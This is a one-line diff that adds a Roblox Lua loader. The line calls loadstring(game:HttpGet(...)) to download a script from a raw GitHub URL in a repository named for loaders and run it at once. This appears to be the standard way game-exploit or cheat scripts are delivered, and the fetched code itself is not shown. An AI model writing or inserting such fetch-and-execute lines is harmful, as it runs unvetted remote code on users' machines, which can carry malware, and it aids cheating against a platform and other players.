@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/pt-3-huss-valley-spam4-6k6p865podypii.lua"))()
